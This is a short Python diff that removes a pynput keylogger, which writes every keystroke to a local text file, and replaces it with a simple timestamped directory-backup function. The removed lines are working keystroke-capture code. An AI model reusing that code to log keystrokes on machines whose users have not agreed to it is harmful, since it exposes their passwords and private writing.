@@ -1,19 +1,23 @@
-from pynput.keyboard import Key, Listener
+import os
+import shutil
+from datetime import datetime
 
-def on_press(key):
-    with open("keystrokes.txt", "a") as f:
-        try:
-            f.write(f'{key.char}')
-        except AttributeError:
-            if key == Key.space:
-                f.write(' ')
-            else:
-                f.write(f'{key}')
+def backup_files(source_dir, backup_dir):
+    # Create backup directory if it doesn't exist
+    if not os.path.exists(backup_dir):
+        os.makedirs(backup_dir)
 
-def on_release(key):
-    if key == Key.esc:
-        # Stop listener
-        return False
+    # Get current date and time for backup folder name
+    current_time = datetime.now().strftime("%Y%m%d%H%M%S")
+    backup_subdir = os.path.join(backup_dir, current_time)
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+    # Copy files from source to backup directory
+    shutil.copytree(source_dir, backup_subdir)
+
+    print(f"Backup completed successfully. Files are backed up to {backup_subdir}")
+
+# Example usage
+source_directory = "path/to/source"
+backup_directory = "path/to/backup"
+backup_files(source_directory, backup_directory)
+
